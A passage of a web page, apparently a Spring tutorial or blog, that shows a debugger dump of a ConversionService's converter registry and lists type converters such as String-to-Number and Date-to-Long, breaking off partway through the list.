&#123;ConcurrentHashMap@6588&#125;  size = 0</span><br><span class="line">   cachedParsers = &#123;ConcurrentHashMap@6589&#125;  size = 0</span><br><span class="line">   converters = &#123;GenericConversionService$Converters@6590&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">    globalConverters = &#123;LinkedHashSet@6593&#125;  size = 0</span><br><span class="line">    converters = &#123;LinkedHashMap@6594&#125;  size = 118</span><br><span class="line">     0 = &#123;LinkedHashMap$Entry@6597&#125; &quot;java.lang.Number -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Number : org.springframework.core.convert.support.NumberToNumberConverterFactory@76561efa&quot;</span><br><span class="line">     1 = &#123;LinkedHashMap$Entry@6598&#125; &quot;java.lang.String -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Number : org.springframework.core.convert.support.StringToNumberConverterFactory@1bf7855e&quot;</span><br><span class="line">     2 = &#123;LinkedHashMap$Entry@6599&#125; &quot;java.lang.Number -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@3932e255&quot;</span><br><span class="line">     3 = &#123;LinkedHashMap$Entry@6600&#125; &quot;java.lang.String -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Character : org.springframework.core.convert.support.StringToCharacterConverter@55a6b63f&quot;</span><br><span class="line">     4 = &#123;LinkedHashMap$Entry@6601&#125; &quot;java.lang.Character -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@1341d3bf&quot;</span><br><span class="line">     5 = &#123;LinkedHashMap$Entry@6602&#125; &quot;java.lang.Number -&gt; java.lang.Character&quot; -&gt; &quot;java.lang.Number -&gt; java.lang.Character : org.springframework.core.convert.support.NumberToCharacterConverter@34bb79fc&quot;</span><br><span class="line">     6 = &#123;LinkedHashMap$Entry@6603&#125; &quot;java.lang.Character -&gt; java.lang.Number&quot; -&gt; &quot;java.lang.Character -&gt; java.lang.Number : org.springframework.core.convert.support.CharacterToNumberFactory@1ab51574&quot;</span><br><span class="line">     7 = &#123;LinkedHashMap$Entry@6604&#125; &quot;java.lang.String -&gt; java.lang.Boolean&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Boolean : org.springframework.core.convert.support.StringToBooleanConverter@7ac24f53&quot;</span><br><span class="line">     8 = &#123;LinkedHashMap$Entry@6605&#125; &quot;java.lang.Boolean -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Boolean -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@6703b79f&quot;</span><br><span class="line">     9 = &#123;LinkedHashMap$Entry@6606&#125; &quot;java.lang.String -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.String -&gt; java.lang.Enum : org.springframework.core.convert.support.StringToEnumConverterFactory@898561a&quot;</span><br><span class="line">     10 = &#123;LinkedHashMap$Entry@6607&#125; &quot;java.lang.Enum -&gt; java.lang.String&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.String : org.springframework.core.convert.support.EnumToStringConverter@3a34ecc8&quot;</span><br><span class="line">     11 = &#123;LinkedHashMap$Entry@6608&#125; &quot;java.lang.Integer -&gt; java.lang.Enum&quot; -&gt; &quot;java.lang.Integer -&gt; java.lang.Enum : org.springframework.core.convert.support.IntegerToEnumConverterFactory@52e4840a&quot;</span><br><span class="line">     12 = &#123;LinkedHashMap$Entry@6609&#125; &quot;java.lang.Enum -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.Enum -&gt; java.lang.Integer : org.springframework.core.convert.support.EnumToIntegerConverter@28217e86&quot;</span><br><span class="line">     13 = &#123;LinkedHashMap$Entry@6610&#125; &quot;java.lang.String -&gt; java.util.Locale&quot; -&gt; &quot;java.lang.String -&gt; java.util.Locale : org.springframework.core.convert.support.StringToLocaleConverter@6243d51e&quot;</span><br><span class="line">     14 = &#123;LinkedHashMap$Entry@6611&#125; &quot;java.util.Locale -&gt; java.lang.String&quot; -&gt; &quot;java.util.Locale -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@7f8c2732&quot;</span><br><span class="line">     15 = &#123;LinkedHashMap$Entry@6612&#125; &quot;java.lang.String -&gt; java.nio.charset.Charset&quot; -&gt; &quot;java.lang.String -&gt; java.nio.charset.Charset : org.springframework.core.convert.support.StringToCharsetConverter@93e281d&quot;</span><br><span class="line">     16 = &#123;LinkedHashMap$Entry@6613&#125; &quot;java.nio.charset.Charset -&gt; java.lang.String&quot; -&gt; &quot;java.nio.charset.Charset -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@2ac8a2f2&quot;</span><br><span class="line">     17 = &#123;LinkedHashMap$Entry@6614&#125; &quot;java.lang.String -&gt; java.util.Currency&quot; -&gt; &quot;java.lang.String -&gt; java.util.Currency : org.springframework.core.convert.support.StringToCurrencyConverter@565f7990&quot;</span><br><span class="line">     18 = &#123;LinkedHashMap$Entry@6615&#125; &quot;java.util.Currency -&gt; java.lang.String&quot; -&gt; &quot;java.util.Currency -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@487461de&quot;</span><br><span class="line">     19 = &#123;LinkedHashMap$Entry@6616&#125; &quot;java.lang.String -&gt; java.util.Properties&quot; -&gt; &quot;java.lang.String -&gt; java.util.Properties : org.springframework.core.convert.support.StringToPropertiesConverter@3072d60d&quot;</span><br><span class="line">     20 = &#123;LinkedHashMap$Entry@6617&#125; &quot;java.util.Properties -&gt; java.lang.String&quot; -&gt; &quot;java.util.Properties -&gt; java.lang.String : org.springframework.core.convert.support.PropertiesToStringConverter@5f423dc3&quot;</span><br><span class="line">     21 = &#123;LinkedHashMap$Entry@6618&#125; &quot;java.lang.String -&gt; java.util.UUID&quot; -&gt; &quot;java.lang.String -&gt; java.util.UUID : org.springframework.core.convert.support.StringToUUIDConverter@72fc4c42&quot;</span><br><span class="line">     22 = &#123;LinkedHashMap$Entry@6619&#125; &quot;java.util.UUID -&gt; java.lang.String&quot; -&gt; &quot;java.util.UUID -&gt; java.lang.String : org.springframework.core.convert.support.ObjectToStringConverter@196db952&quot;</span><br><span class="line">     23 = &#123;LinkedHashMap$Entry@6620&#125; &quot;[Ljava.lang.Object; -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToCollectionConverter@3f09c6cc&quot;</span><br><span class="line">     24 = &#123;LinkedHashMap$Entry@6621&#125; &quot;java.util.Collection -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToArrayConverter@716b58cb&quot;</span><br><span class="line">     25 = &#123;LinkedHashMap$Entry@6622&#125; &quot;[Ljava.lang.Object; -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToArrayConverter@61e594f8&quot;</span><br><span class="line">     26 = &#123;LinkedHashMap$Entry@6623&#125; &quot;java.util.Collection -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToCollectionConverter@153616bf&quot;</span><br><span class="line">     27 = &#123;LinkedHashMap$Entry@6624&#125; &quot;java.util.Map -&gt; java.util.Map&quot; -&gt; &quot;org.springframework.core.convert.support.MapToMapConverter@64f88d73&quot;</span><br><span class="line">     28 = &#123;LinkedHashMap$Entry@6625&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToStringConverter@4f7e3c27&quot;</span><br><span class="line">     29 = &#123;LinkedHashMap$Entry@6626&#125; &quot;java.lang.String -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StringToArrayConverter@2713364&quot;</span><br><span class="line">     30 = &#123;LinkedHashMap$Entry@6627&#125; &quot;[Ljava.lang.Object; -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ArrayToObjectConverter@27574e7b&quot;</span><br><span class="line">     31 = &#123;LinkedHashMap$Entry@6628&#125; &quot;java.lang.Object -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToArrayConverter@7e4ccf7&quot;</span><br><span class="line">     32 = &#123;LinkedHashMap$Entry@6629&#125; &quot;java.util.Collection -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToStringConverter@39455728&quot;</span><br><span class="line">     33 = &#123;LinkedHashMap$Entry@6630&#125; &quot;java.lang.String -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StringToCollectionConverter@32a4a977&quot;</span><br><span class="line">     34 = &#123;LinkedHashMap$Entry@6631&#125; &quot;java.util.Collection -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.CollectionToObjectConverter@2f1d1dce&quot;</span><br><span class="line">     35 = &#123;LinkedHashMap$Entry@6632&#125; &quot;java.lang.Object -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToCollectionConverter@ebfffae&quot;</span><br><span class="line">     36 = &#123;LinkedHashMap$Entry@6633&#125; &quot;[Ljava.lang.Object; -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     37 = &#123;LinkedHashMap$Entry@6634&#125; &quot;java.util.Collection -&gt; java.util.stream.Stream&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     38 = &#123;LinkedHashMap$Entry@6635&#125; &quot;java.util.stream.Stream -&gt; java.util.Collection&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     39 = &#123;LinkedHashMap$Entry@6636&#125; &quot;java.util.stream.Stream -&gt; [Ljava.lang.Object;&quot; -&gt; &quot;org.springframework.core.convert.support.StreamConverter@1d500546&quot;</span><br><span class="line">     40 = &#123;LinkedHashMap$Entry@6637&#125; &quot;java.nio.ByteBuffer -&gt; [B&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     41 = &#123;LinkedHashMap$Entry@6638&#125; &quot;java.nio.ByteBuffer -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     42 = &#123;LinkedHashMap$Entry@6639&#125; &quot;java.lang.Object -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     43 = &#123;LinkedHashMap$Entry@6640&#125; &quot;[B -&gt; java.nio.ByteBuffer&quot; -&gt; &quot;org.springframework.core.convert.support.ByteBufferConverter@aa8e88a&quot;</span><br><span class="line">     44 = &#123;LinkedHashMap$Entry@6641&#125; &quot;java.lang.String -&gt; java.util.TimeZone&quot; -&gt; &quot;java.lang.String -&gt; java.util.TimeZone : org.springframework.core.convert.support.StringToTimeZoneConverter@4d1c677c&quot;</span><br><span class="line">     45 = &#123;LinkedHashMap$Entry@6642&#125; &quot;java.time.ZoneId -&gt; java.util.TimeZone&quot; -&gt; &quot;java.time.ZoneId -&gt; java.util.TimeZone : org.springframework.core.convert.support.ZoneIdToTimeZoneConverter@3c2fb3fe&quot;</span><br><span class="line">     46 = &#123;LinkedHashMap$Entry@6643&#125; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.util.Calendar : org.springframework.core.convert.support.ZonedDateTimeToCalendarConverter@2148eb08&quot;</span><br><span class="line">     47 = &#123;LinkedHashMap$Entry@6644&#125; &quot;java.lang.Object -&gt; java.lang.Object&quot; -&gt; &quot;org.springframework.core.convert.support.IdToEntityConverter@6c69ab13,org.springframework.core.convert.support.ObjectToObjectConverter@42600665&quot;</span><br><span class="line">     48 = &#123;LinkedHashMap$Entry@6645&#125; &quot;java.lang.Object -&gt; java.lang.String&quot; -&gt; &quot;org.springframework.core.convert.support.FallbackObjectToStringConverter@311fd94&quot;</span><br><span class="line">     49 = &#123;LinkedHashMap$Entry@6646&#125; &quot;java.lang.Object -&gt; java.util.Optional&quot; -&gt; &quot;org.springframework.core.convert.support.ObjectToOptionalConverter@65e75655&quot;</span><br><span class="line">     50 = &#123;LinkedHashMap$Entry@6647&#125; &quot;java.lang.Integer -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Integer -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     51 = &#123;LinkedHashMap$Entry@6648&#125; &quot;java.lang.String -&gt; java.lang.Integer&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Integer: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     52 = &#123;LinkedHashMap$Entry@6649&#125; &quot;java.lang.Float -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Float -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     53 = &#123;LinkedHashMap$Entry@6650&#125; &quot;java.lang.String -&gt; java.lang.Float&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Float: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     54 = &#123;LinkedHashMap$Entry@6651&#125; &quot;java.math.BigInteger -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigInteger -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     55 = &#123;LinkedHashMap$Entry@6652&#125; &quot;java.lang.String -&gt; java.math.BigInteger&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigInteger: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     56 = &#123;LinkedHashMap$Entry@6653&#125; &quot;java.lang.Byte -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Byte -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     57 = &#123;LinkedHashMap$Entry@6654&#125; &quot;java.lang.String -&gt; java.lang.Byte&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Byte: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     58 = &#123;LinkedHashMap$Entry@6655&#125; &quot;java.lang.Double -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Double -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     59 = &#123;LinkedHashMap$Entry@6656&#125; &quot;java.lang.String -&gt; java.lang.Double&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Double: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     60 = &#123;LinkedHashMap$Entry@6657&#125; &quot;java.lang.Short -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.lang.Short -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     61 = &#123;LinkedHashMap$Entry@6658&#125; &quot;java.lang.String -&gt; java.lang.Short&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Short: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     62 = &#123;LinkedHashMap$Entry@6659&#125; &quot;java.lang.Long -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     63 = &#123;LinkedHashMap$Entry@6660&#125; &quot;java.lang.String -&gt; java.lang.Long&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.lang.Long: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.lang.Long: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     64 = &#123;LinkedHashMap$Entry@6661&#125; &quot;java.math.BigDecimal -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.NumberFormat java.math.BigDecimal -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     65 = &#123;LinkedHashMap$Entry@6662&#125; &quot;java.lang.String -&gt; java.math.BigDecimal&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.NumberFormat java.math.BigDecimal: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9&quot;</span><br><span class="line">     66 = &#123;LinkedHashMap$Entry@6663&#125; &quot;java.util.Date -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@a178d09,java.util.Date -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$DateToLongConverter@551d27e0&quot;</span><br><span class="line">     67 = &#123;LinkedHashMap$Entry@6664&#125; &quot;java.util.Date -&gt; java.util.Calendar&quot; -&gt; &quot;java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@2bd20c9a,java.util.Date -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$DateToCalendarConverter@1c6b5a31&quot;</span><br><span class="line">     68 = &#123;LinkedHashMap$Entry@6665&#125; &quot;java.util.Calendar -&gt; java.util.Date&quot; -&gt; &quot;java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@2aa2f370,java.util.Calendar -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToDateConverter@163cf3e3&quot;</span><br><span class="line">     69 = &#123;LinkedHashMap$Entry@6666&#125; &quot;java.util.Calendar -&gt; java.lang.Long&quot; -&gt; &quot;java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@2db18b62,java.util.Calendar -&gt; java.lang.Long : org.springframework.format.datetime.DateFormatterRegistrar$CalendarToLongConverter@6bcdf637&quot;</span><br><span class="line">     70 = &#123;LinkedHashMap$Entry@6667&#125; &quot;java.lang.Long -&gt; java.util.Date&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@56c9b14d,java.lang.Long -&gt; java.util.Date : org.springframework.format.datetime.DateFormatterRegistrar$LongToDateConverter@271bf39c&quot;</span><br><span class="line">     71 = &#123;LinkedHashMap$Entry@6668&#125; &quot;java.lang.Long -&gt; java.util.Calendar&quot; -&gt; &quot;java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@6d08686,java.lang.Long -&gt; java.util.Calendar : org.springframework.format.datetime.DateFormatterRegistrar$LongToCalendarConverter@2a8b425&quot;</span><br><span class="line">     72 = &#123;LinkedHashMap$Entry@6669&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalDateConverter@19f02ee4&quot;</span><br><span class="line">     73 = &#123;LinkedHashMap$Entry@6670&#125; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.LocalDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$LocalDateTimeToLocalTimeConverter@618fb955&quot;</span><br><span class="line">     74 = &#123;LinkedHashMap$Entry@6671&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateConverter@63e9f754&quot;</span><br><span class="line">     75 = &#123;LinkedHashMap$Entry@6672&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalTimeConverter@24a76e90&quot;</span><br><span class="line">     76 = &#123;LinkedHashMap$Entry@6673&#125; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToLocalDateTimeConverter@3cb8e3ee&quot;</span><br><span class="line">     77 = &#123;LinkedHashMap$Entry@6674&#125; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToOffsetDateTimeConverter@2061a03d&quot;</span><br><span class="line">     78 = &#123;LinkedHashMap$Entry@6675&#125; &quot;java.time.ZonedDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.ZonedDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$ZonedDateTimeToInstantConverter@c1ea032&quot;</span><br><span class="line">     79 = &#123;LinkedHashMap$Entry@6676&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateConverter@13d29ccf&quot;</span><br><span class="line">     80 = &#123;LinkedHashMap$Entry@6677&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalTimeConverter@680eaac8&quot;</span><br><span class="line">     81 = &#123;LinkedHashMap$Entry@6678&#125; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToLocalDateTimeConverter@45438fbc&quot;</span><br><span class="line">     82 = &#123;LinkedHashMap$Entry@6679&#125; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToZonedDateTimeConverter@3ca5a816&quot;</span><br><span class="line">     83 = &#123;LinkedHashMap$Entry@6680&#125; &quot;java.time.OffsetDateTime -&gt; java.time.Instant&quot; -&gt; &quot;java.time.OffsetDateTime -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$OffsetDateTimeToInstantConverter@3b166fa9&quot;</span><br><span class="line">     84 = &#123;LinkedHashMap$Entry@6681&#125; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.ZonedDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToZonedDateTimeConverter@2653dae9&quot;</span><br><span class="line">     85 = &#123;LinkedHashMap$Entry@6682&#125; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.OffsetDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToOffsetDateTimeConverter@7f348ff0&quot;</span><br><span class="line">     86 = &#123;LinkedHashMap$Entry@6683&#125; &quot;java.util.Calendar -&gt; java.time.LocalDate&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDate : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateConverter@6e407d18&quot;</span><br><span class="line">     87 = &#123;LinkedHashMap$Entry@6684&#125; &quot;java.util.Calendar -&gt; java.time.LocalTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalTimeConverter@66a32c5e&quot;</span><br><span class="line">     88 = &#123;LinkedHashMap$Entry@6685&#125; &quot;java.util.Calendar -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.LocalDateTime : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToLocalDateTimeConverter@5e9f36f1&quot;</span><br><span class="line">     89 = &#123;LinkedHashMap$Entry@6686&#125; &quot;java.util.Calendar -&gt; java.time.Instant&quot; -&gt; &quot;java.util.Calendar -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$CalendarToInstantConverter@50f69dd&quot;</span><br><span class="line">     90 = &#123;LinkedHashMap$Entry@6687&#125; &quot;java.lang.Long -&gt; java.time.Instant&quot; -&gt; &quot;java.lang.Long -&gt; java.time.Instant : org.springframework.format.datetime.standard.DateTimeConverters$LongToInstantConverter@684a7cd9&quot;</span><br><span class="line">     91 = &#123;LinkedHashMap$Entry@6688&#125; &quot;java.time.Instant -&gt; java.lang.Long&quot; -&gt; &quot;java.time.Instant -&gt; java.lang.Long : org.springframework.format.datetime.standard.DateTimeConverters$InstantToLongConverter@17f47c52&quot;</span><br><span class="line">     92 = &#123;LinkedHashMap$Entry@6689&#125; &quot;java.time.LocalDate -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0&quot;</span><br><span class="line">     93 = &#123;LinkedHashMap$Entry@6690&#125; &quot;java.lang.String -&gt; java.time.LocalDate&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDate: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDate: org.springframework.format.datetime.standard.TemporalAccessorParser@75d32f15&quot;</span><br><span class="line">     94 = &#123;LinkedHashMap$Entry@6691&#125; &quot;java.time.LocalTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41f1db11&quot;</span><br><span class="line">     95 = &#123;LinkedHashMap$Entry@6692&#125; &quot;java.lang.String -&gt; java.time.LocalTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2ea20f2c&quot;</span><br><span class="line">     96 = &#123;LinkedHashMap$Entry@6693&#125; &quot;java.time.LocalDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@41fc9576&quot;</span><br><span class="line">     97 = &#123;LinkedHashMap$Entry@6694&#125; &quot;java.lang.String -&gt; java.time.LocalDateTime&quot; -&gt; &quot;java.lang.String -&gt; @org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.lang.String -&gt; java.time.LocalDateTime: org.springframework.format.datetime.standard.TemporalAccessorParser@2dbba1db&quot;</span><br><span class="line">     98 = &#123;LinkedHashMap$Entry@6695&#125; &quot;java.time.ZonedDateTime -&gt; java.lang.String&quot; -&gt; &quot;@org.springframework.format.annotation.DateTimeFormat java.time.ZonedDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.ZonedDateTime 